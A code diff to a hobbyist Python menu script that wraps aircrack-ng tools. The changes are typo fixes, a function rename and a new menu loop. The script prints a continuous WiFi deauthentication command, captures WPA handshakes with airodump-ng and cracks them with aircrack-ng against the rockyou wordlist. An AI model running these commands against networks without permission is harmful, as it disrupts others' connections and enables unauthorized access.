@@ -56,7 +56,7 @@ def capture():
     print("Once a message appears at the top that reads 'Handshake Captured' press Ctrl+C")
     time.sleep(3)
     command = str("sudo aireplay-ng --deauth 0 -a" + str(bssid) + " " + wifi)
-    print("Open a new terminal and typ the following" + command)
+    print("Open a new terminal and type the following...  " + command)
     time.sleep(3)
     print("Scan will begin in 3...")
     time.sleep(1)
@@ -67,7 +67,6 @@ def capture():
     os.system("airodump-ng -w " + str(bssid) + " -c " + str(ch) + " --bssid " + str(bssid) + " " + wifi)
     time.sleep(2)
     os.system("clear")
-    time.sleep(2)
     return
 
 ## Couldn't make the deauth automatic
@@ -84,7 +83,7 @@ if __name__ == '__axon__':
 '''
 
 
-def dencrypt():
+def decrypt():
     print("Decryption will now be attempted!")
     os.system("sudo aircrack-ng " + bssid + "-01.cap -w rockyou.txt")
     return
@@ -117,22 +116,25 @@ options = "------------------------------------------------------------------\n"
 menu()
 decision = input("Select a Number (1-6):")
 
-while decision != "6":
-    if decision == "1":
-        checklist()
-    elif decision == "2":
-        adapter()
-    elif decision == "3":
-        scan()
-    elif decision == "4":
-        capture()
-    elif decision == "5":
-        dencrypt()
-    else:
-        print("Invalid Input")
-
-    print()
-    menu()
+while True:
+    print(logo, options)
     decision = input("Select a Number (1-6):")
+
+    match decision:
+        case "1":
+            checklist()
+        case "2":
+            adapter()
+        case "3":
+            scan()
+        case "4":
+            capture()
+        case "5":
+            decrypt()
+        case "6":
+            break
+        case _:
+            continue
+
 
 print("Thanks for trying my program! Goodbye.")
